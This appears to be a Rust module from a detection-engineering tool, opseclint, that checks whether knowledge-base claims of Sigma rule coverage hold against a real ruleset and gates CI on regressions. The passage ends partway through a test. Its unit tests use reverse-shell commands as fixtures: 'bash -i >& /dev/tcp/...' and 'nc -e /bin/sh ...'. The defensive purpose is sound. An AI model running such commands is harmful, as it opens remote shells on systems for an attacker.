//! Detection verification. opseclint's knowledge base *claims* that each entry
//! is caught by a Sigma detection (`detections[].source == "Sigma"`). This
//! module proves those claims against a real ruleset: for every entry that
//! carries a Sigma claim, it synthesizes a representative command — and, for an
//! entry carrying an `event` axis, a representative file/registry/network record
//! — then checks whether a genuine SigmaHQ rule for the entry's technique(s)
//! would actually *fire* on it. A rule is asked about the kind of record it
//! declares a logsource for, and only that kind.
//!
//! Unlike `--coverage-gaps` (which audits the *input* actions a user analyzes),
//! this audits the knowledge base itself, so it can run in CI as a regression
//! gate: a claimed detection that stops firing is a real quality regression.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};

use opseclint_core::kb::Platform;
use opseclint_core::model::{KbEntry, KnowledgeBase};
use opseclint_core::parser::{self, Command};
use opseclint_core::sigma::{SigmaIndex, SigmaRule};
use opseclint_core::sigma_eval::{self, Outcome, Verdict};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Status {
    /// A real rule for the entry's technique(s) fires on its command. Claim holds.
    Verified,
    /// Rules exist for the technique(s) but none fire on the command. The KB
    /// claims a detection the live ruleset does not substantiate.
    Unverified,
    /// Rules exist but only evaluate to INDETERMINATE (need host fields opseclint
    /// cannot synthesize). Neither confirmed nor refuted.
    Indeterminate,
    /// No rule in the ruleset covers the entry's technique(s) at all.
    NoRule,
    /// Rules exist for the technique(s), but every one of them declares a
    /// logsource this entry cannot satisfy — a PowerShell script block, a proxy
    /// log, or a file/registry event from an entry that models no such record.
    /// Not an abstention: the question was never addressed to anything the
    /// entry describes. Reported apart from `Indeterminate` so that count keeps
    /// its meaning of "answerable with more data".
    NotApplicable,
    /// Delta-only: a previously-verified entry vanished from the current run
    /// (its entry or Sigma claim was removed). Never produced by classify.
    Removed,
}

impl Status {
    fn label(self) -> &'static str {
        match self {
            Status::Verified => "VERIFIED",
            Status::Unverified => "UNVERIFIED",
            Status::Indeterminate => "INDETERMINATE",
            Status::NoRule => "NO-RULE",
            Status::NotApplicable => "NOT-APPLICABLE",
            Status::Removed => "REMOVED",
        }
    }

    fn rank(self) -> u8 {
        match self {
            Status::Unverified => 0,
            Status::NoRule => 1,
            Status::NotApplicable => 1,
            Status::Indeterminate => 2,
            Status::Verified => 3,
            Status::Removed => 0,
        }
    }

    /// True when the ruleset actively *refutes* the claim: rules for the
    /// technique exist, were asked, and none fire. Distinct from the merely
    /// unproven statuses — `NoRule`, `NotApplicable` and `Indeterminate` mean
    /// nobody answered; `Unverified` means the answer was no. Only the latter
    /// is a defect the knowledge base owns.
    ///
    /// Deliberately not written as `rank() == 0`: `Removed` ranks 0 too, so a
    /// rank test would read every deletion as a refuted claim.
    fn is_refuted(self) -> bool {
        matches!(self, Status::Unverified)
    }
}

fn is_zero(n: &usize) -> bool {
    *n == 0
}

fn is_false(b: &bool) -> bool {
    !*b
}

/// Why an entry came out `Indeterminate`, unioned over its candidate rules.
///
/// `Indeterminate` is one status but it has several distinct causes, and until
/// they are told apart the count says only "the evaluator abstained a lot" — not
/// whether that is fixable, and if so by what. The two actionable causes are
/// very different work: `modifiers` is evaluator features we could implement,
/// `missing_fields` is host telemetry the tool would have to be handed.
///
/// Causes are not mutually exclusive; one entry can report several.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct IndeterminateCause {
    /// Modifier tokens the evaluator does not implement (`re`, `windash`, …).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub modifiers: Vec<String>,
    /// Fields a rule keys on that a command line cannot supply.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub missing_fields: Vec<String>,
    /// Candidate rules that could not be lowered to detection logic at all.
    #[serde(default, skip_serializing_if = "is_zero")]
    pub unparsed_rules: usize,
    /// Candidate rules set aside because their logsource is a class this entry
    /// does not model at all — neither a process execution nor the record its
    /// `event` axis describes. Never evaluated, so they contribute to no other
    /// cause here.
    #[serde(default, skip_serializing_if = "is_zero")]
    pub inapplicable_rules: usize,
    /// A rule asserted a field is absent (`field: null`). Abstaining is
    /// arguably correct, so this is reported apart from the fixable causes.
    #[serde(default, skip_serializing_if = "is_false")]
    pub null_value_match: bool,
    /// The entry has no representative line to evaluate against — a
    /// knowledge-base gap, not a rule-side one. Explicit rather than inferred
    /// from an otherwise-empty cause, so it survives other fields being set.
    #[serde(default, skip_serializing_if = "is_false")]
    pub no_representative: bool,
}

impl IndeterminateCause {
    pub fn is_empty(&self) -> bool {
        *self == Self::default()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VerifyResult {
    pub id: String,
    pub description: String,
    pub techniques: Vec<String>,
    /// The rule name(s) the KB claims detect this action.
    pub claimed: Vec<String>,
    pub status: Status,
    /// Titles of the real rules that fire (when `Verified`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub firing: Vec<String>,
    /// Populated only for `Unverified`: the rules that were put the question and
    /// answered no. The counterpart of `firing`, and the whole content of that
    /// verdict — an entry is refuted precisely because every rule asked about it
    /// said no, so naming them says what would have to change for the claim to
    /// stand. Without it the status reports that a claim is contradicted but not
    /// by what, and the reader is left grepping the ruleset by ATT&CK tag to
    /// rediscover the candidate set the tool already computed.
    ///
    /// Rules set aside as inapplicable are absent by construction: had every
    /// candidate been set aside the entry would read `NotApplicable`, and a rule
    /// that abstained would have made it `Indeterminate`. Absent from older
    /// baselines, which still deserialize.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub not_firing: Vec<String>,
    /// Populated only for `Indeterminate`. Absent from older baselines, which
    /// still deserialize — `--diff` compares `status` by `id` and ignores this.
    #[serde(default, skip_serializing_if = "IndeterminateCause::is_empty")]
    pub because: IndeterminateCause,
}

/// A saveable verification run: platform, ruleset revision, ruleset size, and
/// per-entry results. Serialized by `--verify-detections --json`, read back by
/// `--diff`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VerifyReport {
    pub platform: String,
    /// The ruleset revision this run was computed against, as given by
    /// `--sigma-ref`. It is what makes a saved baseline say which ruleset
    /// produced it, so a `--diff` months later can tell a knowledge-base
    /// regression apart from upstream drift. Absent from older baselines and
    /// from runs that named no ref, which still deserialize — `--diff`
    /// compares `status` by `id` and only *notes* a mismatch here.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sigma_ref: Option<String>,
    pub rules_indexed: usize,
    pub results: Vec<VerifyResult>,
}

impl VerifyReport {
    pub fn count(&self, status: Status) -> usize {
        self.results.iter().filter(|r| r.status == status).count()
    }
}

/// True when the entry carries at least one Sigma detection claim.
fn claims_sigma(entry: &KbEntry) -> bool {
    entry
        .detections
        .iter()
        .any(|d| d.source.eq_ignore_ascii_case("sigma"))
}

/// The Sigma rule name(s) the entry claims.
fn claimed_rules(entry: &KbEntry) -> Vec<String> {
    entry
        .detections
        .iter()
        .filter(|d| d.source.eq_ignore_ascii_case("sigma"))
        .map(|d| d.rule.clone())
        .filter(|r| !r.is_empty())
        .collect()
}

/// Build a representative command for a KB entry: a synthetic command line the
/// entry matches (its `example`, or one derived from the matcher's literals), so
/// the synthesized event carries what a real rule would look for.
fn representative_command(entry: &KbEntry) -> Option<Command> {
    let line = entry.representative_line()?;
    parser::parse_line(&line).into_iter().next()
}

/// The outcome of putting every candidate rule to one entry. A struct rather
/// than a tuple because three of the four fields are `Vec`s and a positional
/// reading of them is a bug waiting to happen.
struct Classification {
    status: Status,
    firing: Vec<String>,
    not_firing: Vec<String>,
    because: IndeterminateCause,
}

impl Classification {
    /// A verdict carrying nothing but its status. `Status` has no meaningful
    /// default of its own, so this stands in for one — the detail fields are
    /// what each arm below fills in.
    fn of(status: Status) -> Self {
        Self {
            status,
            firing: Vec::new(),
            not_firing: Vec::new(),
            because: IndeterminateCause::default(),
        }
    }
}

/// Classify a single entry against the ruleset. Mirrors the fire/indeterminate/
/// gap logic used by coverage analysis so the two stay consistent.
fn classify(entry: &KbEntry, index: &SigmaIndex, platform: Platform) -> Classification {
    let tids: Vec<String> = entry.techniques.iter().map(|t| t.id.clone()).collect();
    // The full candidate set, not the display-capped one: a claim is only
    // honestly contradicted once every rule for its technique has been asked.
    let all_candidates = index.candidate_rules(&tids);
    if all_candidates.is_empty() {
        return Classification::of(Status::NoRule);
    }
    // The synthetic record the entry's `event` axis derives — the non-execution
    // counterpart of its representative command line. `None` for an entry with
    // no `event` axis, and (defensively) for one whose axis yields no positive
    // literal; `KnowledgeBase::validate` rejects the latter at load, and leaving
    // it `None` here keeps a malformed entry from being credited on a record
    // that was never derived.
    let record = entry.matcher.representative_event();

    // Rules whose logsource is a different event class still cannot fire on a
    // synthesized process-execution event, and evaluating them against one would
    // only manufacture abstentions — or worse, a spurious `Fires` for a
    // file/registry rule that happens to key on `CommandLine`. But a rule asking
    // about the *same* class of record the entry's `event` axis describes has
    // something of its own to fire on, so it is evaluated against that record
    // rather than set aside. The two buckets cannot overlap: a rule with no
    // category is process-applicable, and no event class maps to an empty one.
    let mut process_rules = Vec::new();
    let mut event_rules = Vec::new();
    let mut inapplicable = 0usize;
    for c in all_candidates {
        if c.applies_to_process_execution() {
            process_rules.push(c);
        } else if record
            .as_ref()
            .is_some_and(|(class, _)| c.applies_to_event_class(*class))
        {
            event_rules.push(c);
        } else {
            inapplicable += 1;
        }
    }
    if process_rules.is_empty() && event_rules.is_empty() {
        return Classification {
            because: IndeterminateCause {
                inapplicable_rules: inapplicable,
                ..Default::default()
            },
            ..Classification::of(Status::NotApplicable)
        };
    }

    let mut tally = Tally::default();
    if !process_rules.is_empty() {
        match representative_command(entry) {
            Some(cmd) => {
                for c in &process_rules {
                    tally.ask(c, |dr| sigma_eval::evaluate(dr, &cmd, platform));
                }
            }
            None => {
                // No representative line to evaluate the process rules against —
                // a knowledge-base gap, not a rule-side cause. Recorded rather
                // than returned, because the event rules below may still answer.
                tally.any_indet = true;
                tally.cause.no_representative = true;
            }
        }
    }
    // `event_rules` is only ever non-empty when `record` is `Some`.
    if let Some((_, fields)) = &record {
        for c in &event_rules {
            tally.ask(c, |dr| sigma_eval::evaluate_record(dr, fields));
        }
    }

    tally.verdict(inapplicable)
}

/// Accumulates the verdicts of the rules asked about one entry. Both the
/// process-execution rules and the event rules feed the same tally, so the two
/// paths cannot drift on how a verdict is folded in.
#[derive(Default)]
struct Tally {
    firing: Vec<String>,
    not_firing: Vec<String>,
    any_indet: bool,
    mods: BTreeSet<String>,
    fields: BTreeSet<String>,
    cause: IndeterminateCause,
}

impl Tally {
    /// Put the question to one candidate rule, evaluating it with `eval`.
    fn ask(&mut self, rule: &SigmaRule, eval: impl FnOnce(&sigma_eval::DetectionRule) -> Verdict) {
        let Some(dr) = &rule.rule else {
            // The rule could not be lowered to logic at all — a parser gap, not
            // an evaluation gap. Counted apart from the rest.
            self.any_indet = true;
            self.cause.unparsed_rules += 1;
            return;
        };
        let v = eval(dr);
        match v.outcome {
            Outcome::Fires => self.firing.push(rule.title.clone()),
            Outcome::Indeterminate => {
                self.any_indet = true;
                self.mods.extend(v.blocking_modifiers);
                self.fields.extend(v.missing_fields);
                self.cause.null_value_match |= v.null_value_match;
            }
            Outcome::NoFire => self.not_firing.push(rule.title.clone()),
        }
    }

    /// The entry's status. One firing rule is enough, whichever log source it
    /// asked about: the claim is that a real rule catches the action, not that
    /// every record the entry models is separately covered.
    fn verdict(self, inapplicable: usize) -> Classification {
        if !self.firing.is_empty() {
            // The refusals are dropped rather than reported: one firing rule
            // settles the claim, and listing what else declined would read as
            // doubt about a verdict that is not in doubt.
            Classification {
                firing: self.firing,
                ..Classification::of(Status::Verified)
            }
        } else if self.any_indet {
            let mut cause = self.cause;
            cause.modifiers = self.mods.into_iter().collect();
            cause.missing_fields = self.fields.into_iter().collect();
            cause.inapplicable_rules = inapplicable;
            Classification {
                because: cause,
                ..Classification::of(Status::Indeterminate)
            }
        } else {
            // Nothing abstained and nothing fired, so every applicable rule
            // answered no — and those answers are the entire verdict.
            let mut not_firing = self.not_firing;
            not_firing.sort();
            Classification {
                not_firing,
                ..Classification::of(Status::Unverified)
            }
        }
    }
}

/// Verify every entry that carries a Sigma detection claim.
pub fn verify(kb: &KnowledgeBase, index: &SigmaIndex, platform: Platform) -> VerifyReport {
    let mut results: Vec<VerifyResult> = kb
        .entries
        .iter()
        .filter(|e| claims_sigma(e))
        .map(|e| {
            let c = classify(e, index, platform);
            VerifyResult {
                id: e.id.clone(),
                description: e.description.clone(),
                techniques: e.techniques.iter().map(|t| t.id.clone()).collect(),
                claimed: claimed_rules(e),
                status: c.status,
                firing: c.firing,
                not_firing: c.not_firing,
                because: c.because,
            }
        })
        .collect();
    // Worst status first, then by id for a stable ordering.
    results.sort_by(|a, b| a.status.rank().cmp(&b.status.rank()).then(a.id.cmp(&b.id)));
    VerifyReport {
        platform: platform.sigma_product().to_string(),
        // The caller stamps this from `--sigma-ref`: `verify` is handed an
        // already-built index and has no way to know which revision produced
        // it, and a guessed provenance is worse than none.
        sigma_ref: None,
        rules_indexed: index.rules_indexed,
        results,
    }
}

/// Rank a histogram by count, then name, and render the top few as
/// `name N, name N, …` with a tail marker when it is truncated.
fn top_n(hist: &BTreeMap<String, usize>, n: usize) -> String {
    let mut v: Vec<(&String, &usize)> = hist.iter().collect();
    v.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
    let shown: Vec<String> = v.iter().take(n).map(|(k, c)| format!("{k} {c}")).collect();
    let mut s = shown.join(", ");
    if v.len() > n {
        s.push_str(&format!(", +{} more", v.len() - n));
    }
    s
}

/// `(label, entries affected, detail)` per cause, worst first. Counts are of
/// *entries*, and overlap: one entry blocked by both a modifier and a missing
/// field is counted in both rows.
fn summarize_causes(report: &VerifyReport) -> Vec<(&'static str, usize, String)> {
    let mut by_mod: BTreeMap<String, usize> = BTreeMap::new();
    let mut by_field: BTreeMap<String, usize> = BTreeMap::new();
    let (mut n_mods, mut n_fields, mut n_unparsed, mut n_null, mut n_none) = (0, 0, 0, 0, 0);
    let mut n_inapp = 0;

    for r in report
        .results
        .iter()
        .filter(|r| r.status == Status::Indeterminate)
    {
        let b = &r.because;
        if !b.modifiers.is_empty() {
            n_mods += 1;
            for m in &b.modifiers {
                *by_mod.entry(m.clone()).or_default() += 1;
            }
        }
        if !b.missing_fields.is_empty() {
            n_fields += 1;
            for f in &b.missing_fields {
                *by_field.entry(f.clone()).or_default() += 1;
            }
        }
        if b.unparsed_rules > 0 {
            n_unparsed += 1;
        }
        if b.inapplicable_rules > 0 {
            n_inapp += 1;
        }
        if b.null_value_match {
            n_null += 1;
        }
        if b.no_representative {
            n_none += 1;
        }
    }

    let mut rows: Vec<(&'static str, usize, String)> = Vec::new();
    if n_mods > 0 {
        rows.push(("modifiers", n_mods, top_n(&by_mod, 5)));
    }
    if n_fields > 0 {
        rows.push(("missing fields", n_fields, top_n(&by_field, 5)));
    }
    if n_unparsed > 0 {
        rows.push(("unparsed rules", n_unparsed, String::new()));
    }
    if n_inapp > 0 {
        rows.push((
            "other logsource",
            n_inapp,
            "candidate rules set aside, not counted above".into(),
        ));
    }
    if n_null > 0 {
        rows.push((
            "field-absent",
            n_null,
            "rule asserts a field is null".into(),
        ));
    }
    if n_none > 0 {
        rows.push((
            "no representative",
            n_none,
            "entry has no line to evaluate".into(),
        ));
    }
    rows.sort_by_key(|r| std::cmp::Reverse(r.1));
    rows
}

pub fn render_json(report: &VerifyReport) -> String {
    serde_json::to_string_pretty(report).unwrap_or_else(|_| "{}".to_string())
}

/// Abbreviate a ruleset revision for display. A 40-hex commit id shortens to
/// its first 12 characters, the length git itself uses for an unambiguous
/// short id on a repository this size; anything else — a tag, a branch, a
/// local marker — is shown whole, because there is no safe place to cut it.
fn short_ref(r: &str) -> &str {
    let is_sha = r.len() == 40 && r.bytes().all(|b| b.is_ascii_hexdigit());
    if is_sha { &r[..12] } else { r }
}

/// Human-readable summary. `color` toggles ANSI styling.
pub fn render(report: &VerifyReport, color: bool) -> String {
    use crate::theme;
    let c = |code: &'static str| -> &'static str { if color { code } else { "" } };
    let reset = c(theme::RESET);

    let verified = report.count(Status::Verified);
    let unverified = report.count(Status::Unverified);
    let indet = report.count(Status::Indeterminate);
    let norule = report.count(Status::NoRule);
    let napp = report.count(Status::NotApplicable);
    let total = report.results.len();

    let mut out = String::new();
    // Name the ruleset revision when the run knows it, so a CI log says what it
    // was computed against without anyone having to reconstruct it.
    let at = match report.sigma_ref.as_deref() {
        Some(r) => format!(" @ {}", short_ref(r)),
        None => String::new(),
    };
    out.push_str(&format!(
        "{}opseclint — detection verification ({}, {} rules indexed{}){}\n",
        c(theme::BOLD),
        report.platform,
        report.rules_indexed,
        at,
        reset
    ));
    out.push_str(&format!(
        "  {}{} verified{}  ·  {}{} unverified{}  ·  {} indeterminate  ·  {} no-rule  ·  {} n/a  ({} claimed)\n",
        c(theme::GREEN),
        verified,
        reset,
        c(theme::RED),
        unverified,
        reset,
        indet,
        norule,
        napp,
        total,
    ));

    // Break the indeterminate bucket down by cause. Without this the count says
    // only "the evaluator abstained a lot"; with it, it says what to go fix and
    // roughly what that would buy.
    if indet > 0 {
        let causes = summarize_causes(report);
        if !causes.is_empty() {
            out.push_str(&format!(
                "\n{}why indeterminate{} ({} entries; an entry can have more than one cause)\n",
                c(theme::BOLD),
                reset,
                indet,
            ));
            for (label, count, detail) in causes {
                out.push_str(&format!(
                    "  {:<16} {:>4}{}\n",
                    label,
                    count,
                    if detail.is_empty() {
                        String::new()
                    } else {
                        format!("  {}{}{}", c(theme::COMMENT), detail, reset)
                    },
                ));
            }
        }
    }

    // Only the actionable buckets get listed: unverified (contradicted claims)
    // and no-rule (unbacked claims). Verified/indeterminate are summarized above.
    let mut listed = false;
    for r in report
        .results
        .iter()
        .filter(|r| matches!(r.status, Status::Unverified | Status::NoRule))
    {
        if !listed {
            out.push('\n');
            listed = true;
        }
        let (mark, col) = match r.status {
            Status::Unverified => ("✗", c(theme::RED)),
            _ => ("·", c(theme::COMMENT)),
        };
        out.push_str(&format!(
            "  {col}{mark} {label:<11}{reset} {id}  [{tids}]\n      {desc}\n",
            label = r.status.label(),
            id = r.id,
            tids = r.techniques.join(", "),
            desc = r.description,
        ));
        // The rules that answered no. This is the whole content of an
        // `UNVERIFIED` verdict, and without it the reader has to grep the
        // ruleset by ATT&CK tag to rediscover a candidate set already computed
        // here.
        for title in &r.not_firing {
            out.push_str(&format!(
                "      {}· asked, no fire: {title}{reset}\n",
                c(theme::COMMENT)
            ));
        }
    }
    out
}

// --- baseline diff (regression gate) --------------------------------------

#[derive(Debug, Clone, Serialize)]
pub struct StatusChange {
    pub id: String,
    pub description: String,
    pub from: Status,
    pub to: Status,
}

/// A claim in the current run with no baseline row at all. Not a
/// `StatusChange`: there is no `from`, and inventing one would put a transition
/// in the output that never happened.
#[derive(Debug, Clone, Serialize)]
pub struct NewClaim {
    pub id: String,
    pub description: String,
    pub status: Status,
}

#[derive(Debug, Clone, Serialize, Default)]
pub struct VerifyDelta {
    /// Entries whose verdict got worse than the baseline's, by `Status::rank`.
    pub regressions: Vec<StatusChange>,
    /// Entries that became Verified (were not before).
    pub improvements: Vec<StatusChange>,
    /// Entries present in the current run but absent from the baseline. *Every*
    /// new claim is listed, not only the refuted ones: a new entry means the
    /// committed baseline is now stale, and that is worth saying even when the
    /// claim verifies. Only the refuted ones fail the gate.
    ///
    /// Always empty under `sigma drift`, which varies the ruleset and not the
    /// knowledge base, so baseline and current always share their id set.
    pub introduced: Vec<NewClaim>,
    pub baseline_verified: usize,
    pub current_verified: usize,
    pub baseline_unverified: usize,
    pub current_unverified: usize,
}

impl VerifyDelta {
    /// An entry that existed before got worse. Keeps its narrow meaning — a
    /// newly-added bad claim is not a regression, because nothing regressed.
    pub fn has_regressed(&self) -> bool {
        !self.regressions.is_empty()
    }

    /// This change adds a claim the ruleset refutes. Not a regression: there
    /// was nothing to fall from. Equally a build failure.
    pub fn has_unsubstantiated_additions(&self) -> bool {
        self.introduced.iter().any(|n| n.status.is_refuted())
    }

    /// The whole `--ci` contract: nothing got worse, no new claim is refuted,
    /// and the refuted count never rises. The third term is implied by the
    /// first two today — every route into `Unverified` is either a rank drop or
    /// a new row — and is kept as the ratchet that becomes a zero floor for
    /// free once the count reaches zero.
    pub fn fails_gate(&self) -> bool {
        self.has_regressed()
            || self.has_unsubstantiated_additions()
            || self.current_unverified > self.baseline_unverified
    }

    /// Why the gate failed, in the caller's words. Lives here so the wording
    /// sits beside the predicate it explains.
    pub fn gate_reason(&self) -> String {
        let mut parts = Vec::new();
        if self.has_regressed() {
            parts.push(format!(
                "{} detection(s) got worse than the baseline",
                self.regressions.len()
            ));
        }
        let refuted = self
            .introduced
            .iter()
            .filter(|n| n.status.is_refuted())
            .count();
        if refuted > 0 {
            parts.push(format!(
                "{refuted} new claim(s) the ruleset does not substantiate"
            ));
        }
        if self.current_unverified > self.baseline_unverified {
            parts.push(format!(
                "the unverified count rose from {} to {}",
                self.baseline_unverified, self.current_unverified
            ));
        }
        parts.join("; ")
    }

    pub fn is_empty(&self) -> bool {
        self.regressions.is_empty() && self.improvements.is_empty() && self.introduced.is_empty()
    }
}

fn by_id(report: &VerifyReport) -> BTreeMap<&str, &VerifyResult> {
    report.results.iter().map(|r| (r.id.as_str(), r)).collect()
}

pub fn compute_delta(baseline: &VerifyReport, current: &VerifyReport) -> VerifyDelta {
    let base = by_id(baseline);
    let curr = by_id(current);
    let mut delta = VerifyDelta {
        baseline_verified: baseline.count(Status::Verified),
        current_verified: current.count(Status::Verified),
        baseline_unverified: baseline.count(Status::Unverified),
        current_unverified: current.count(Status::Unverified),
        ..Default::default()
    };
    for (id, cr) in &curr {
        // No baseline row at all: the claim is new, so there is no transition
        // to report — only the claim and how it currently reads.
        let Some(br) = base.get(id) else {
            delta.introduced.push(NewClaim {
                id: cr.id.clone(),
                description: cr.description.clone(),
                status: cr.status,
            });
            continue;
        };
        // Rank, not equality against `Verified`: `no-rule → unverified` and
        // `indeterminate → unverified` are worsenings too, and the old test
        // saw neither.
        if cr.status.rank() < br.status.rank() {
            delta.regressions.push(StatusChange {
                id: cr.id.clone(),
                description: cr.description.clone(),
                from: br.status,
                to: cr.status,
            });
        // Deliberately *not* the rank mirror of the arm above. Under `rank`,
        // `Unverified → NoRule` is an increase — but re-pointing an entry at a
        // technique nothing covers proves nothing, and labelling it `VERIFIED`
        // in the output would be a lie. Verification is the only improvement.
        } else if br.status != Status::Verified && cr.status == Status::Verified {
            delta.improvements.push(StatusChange {
                id: cr.id.clone(),
                description: cr.description.clone(),
                from: br.status,
                to: cr.status,
            });
        }
    }
    // A previously-verified entry that vanished from the current run is also a
    // regression: the claim is no longer being proven at all, so the gate must
    // not pass just because the id disappeared.
    //
    // Stays keyed on `Verified` rather than on rank, and that is load-bearing:
    // withdrawing a claim the ruleset refutes is the remedy for an `UNVERIFIED`
    // entry, so a gate that punished a vanished `Unverified` row would block
    // its own fix.
    for (id, br) in &base {
        if br.status == Status::Verified && !curr.contains_key(id) {
            delta.regressions.push(StatusChange {
                id: br.id.clone(),
                description: br.description.clone(),
                from: Status::Verified,
                to: Status::Removed,
            });
        }
    }
    delta.regressions.sort_by(|a, b| a.id.cmp(&b.id));
    delta.improvements.sort_by(|a, b| a.id.cmp(&b.id));
    // Worst status first, then id — the ordering `verify` itself reports in.
    delta
        .introduced
        .sort_by(|a, b| a.status.rank().cmp(&b.status.rank()).then(a.id.cmp(&b.id)));
    delta
}

pub fn render_delta(delta: &VerifyDelta, color: bool) -> String {
    use crate::theme;
    let c = |code: &'static str| -> &'static str { if color { code } else { "" } };
    let reset = c(theme::RESET);
    let mut out = String::new();
    out.push_str(&format!(
        "detection verification vs baseline: {} → {} verified · {} → {} unverified\n",
        delta.baseline_verified,
        delta.current_verified,
        delta.baseline_unverified,
        delta.current_unverified,
    ));
    if delta.is_empty() {
        out.push_str("  no change\n");
        return out;
    }
    for r in &delta.regressions {
        out.push_str(&format!(
            "  {}✗ REGRESSED{} {} ({} → {})\n      {}\n",
            c(theme::RED),
            reset,
            r.id,
            r.from.label(),
            r.to.label(),
            r.description,
        ));
    }
    // Marked apart from a regression on purpose: one says a claim that used to
    // hold stopped holding, the other says a claim arrived that never held.
    // The parenthetical names no transition, because none happened.
    for n in &delta.introduced {
        let (mark, label, col) = if n.status.is_refuted() {
            ("✗", "NEW CLAIM ", c(theme::RED))
        } else {
            ("·", "new       ", c(theme::COMMENT))
        };
        out.push_str(&format!(
            "  {col}{mark} {label}{reset} {} ({} — no baseline entry)\n      {}\n",
            n.id,
            n.status.label(),
            n.description,
        ));
    }
    for r in &delta.improvements {
        out.push_str(&format!(
            "  {}✓ VERIFIED{}  {} ({} → {})\n",
            c(theme::GREEN),
            reset,
            r.id,
            r.from.label(),
            r.to.label(),
        ));
    }
    out
}

pub fn render_delta_json(delta: &VerifyDelta) -> String {
    serde_json::to_string_pretty(delta).unwrap_or_else(|_| "{}".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use opseclint_core::kb;
    use opseclint_core::matcher::{EventMatch, LinePred, Matcher, ProgramMatch};
    use opseclint_core::model::{Detection, Technique};
    use std::path::PathBuf;

    fn index() -> SigmaIndex {
        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../tests/fixtures/sigma");
        SigmaIndex::load_dir(&dir, "linux").expect("index loads")
    }

    /// Build a KB entry that claims a Sigma detection, keyed either by an exact
    /// program or by a raw line substring.
    fn entry(id: &str, command: Option<&str>, raw: Option<&str>, tech: &str) -> KbEntry {
        entry_with(id, command, raw, tech, None)
    }

    /// The same, plus an `event` axis given as the JSON the knowledge base
    /// authors — `EventMatch` has no public constructor, and going through serde
    /// exercises the grammar a real entry is written in.
    fn event_entry(
        id: &str,
        command: Option<&str>,
        raw: Option<&str>,
        tech: &str,
        event: &str,
    ) -> KbEntry {
        let event: EventMatch = serde_json::from_str(event).expect("event axis parses");
        entry_with(id, command, raw, tech, Some(event))
    }

    fn entry_with(
        id: &str,
        command: Option<&str>,
        raw: Option<&str>,
        tech: &str,
        event: Option<EventMatch>,
    ) -> KbEntry {
        let matcher = Matcher {
            program: command.map(|c| ProgramMatch::Exact(c.to_string())),
            args: None,
            line: raw.map(|r| LinePred::Contains(r.to_string())),
            event,
        };
        KbEntry {
            id: id.into(),
            matcher,
            example: None,
            description: format!("{id} description"),
            techniques: vec![Technique {
                id: tech.into(),
                name: tech.into(),
            }],
            telemetry: vec![],
            detections: vec![Detection {
                source: "Sigma".into(),
                rule: format!("{id} rule"),
                confidence: "medium".into(),
                verdict: None,
            }],
            noise: 50,
        }
    }

    fn kb_of(entries: Vec<KbEntry>) -> KnowledgeBase {
        KnowledgeBase {
            platform: "linux".into(),
            note: String::new(),
            entries,
        }
    }

    fn result_for<'a>(report: &'a VerifyReport, id: &str) -> &'a VerifyResult {
        report
            .results
            .iter()
            .find(|r| r.id == id)
            .unwrap_or_else(|| panic!("no result for {id}"))
    }

    /// A minimal `VerifyResult` for the delta tests, which care about `id` and
    /// `status` and nothing else.
    fn vr(id: &str, status: Status) -> VerifyResult {
        VerifyResult {
            id: id.into(),
            description: format!("{id} desc"),
            techniques: vec!["T1000".into()],
            claimed: vec!["some rule".into()],
            status,
            firing: vec![],
            not_firing: vec![],
            because: IndeterminateCause::default(),
        }
    }

    fn report_of(results: Vec<VerifyResult>) -> VerifyReport {
        VerifyReport {
            platform: "linux".into(),
            sigma_ref: None,
            rules_indexed: 3,
            results,
        }
    }

    #[test]
    fn verified_when_a_real_rule_fires() {
        // The /dev/tcp reverse-shell fixture (CommandLine contains /dev/tcp/)
        // fires on a realistic reverse-shell command → claim verified.
        let kb = kb_of(vec![entry(
            "revsh",
            None,
            Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            "T1059.004",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(result_for(&report, "revsh").status, Status::Verified);
        assert!(!result_for(&report, "revsh").firing.is_empty());
    }

    #[test]
    fn unverified_when_rule_exists_but_does_not_fire() {
        // Same technique (T1059.004) as the /dev/tcp rule, but a command the rule
        // cannot match → the claim is contradicted.
        let kb = kb_of(vec![entry(
            "nc-revsh",
            None,
            Some("nc -e /bin/sh 10.0.0.1 4444"),
            "T1059.004",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "nc-revsh");
        assert_eq!(r.status, Status::Unverified);
        // The verdict names what refused it. Without this the status says a
        // claim is contradicted but not by what, and the only way to find out
        // is to grep the ruleset by ATT&CK tag.
        assert!(
            !r.not_firing.is_empty(),
            "an unverified claim must name the rules that answered no"
        );
        assert!(r.firing.is_empty());
    }

    #[test]
    fn a_verified_claim_does_not_list_what_declined() {
        // One firing rule settles the claim. Listing the rules that also
        // declined would read as doubt about a verdict that is not in doubt.
        let kb = kb_of(vec![entry(
            "revsh",
            None,
            Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            "T1059.004",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "revsh");
        assert_eq!(r.status, Status::Verified);
        assert!(!r.firing.is_empty());
        assert!(r.not_firing.is_empty());
    }

    #[test]
    fn the_refusing_rules_are_listed_in_a_stable_order() {
        // The list is committed into `.ci/verified-<platform>.json`, so an
        // unstable order would churn the baseline on every regeneration.
        let kb = kb_of(vec![entry(
            "nc-revsh",
            None,
            Some("nc -e /bin/sh 10.0.0.1 4444"),
            "T1059.004",
        )]);
        let idx = index();
        let first = verify(&kb, &idx, kb::Platform::LinuxAuditd);
        let again = verify(&kb, &idx, kb::Platform::LinuxAuditd);
        let a = &result_for(&first, "nc-revsh").not_firing;
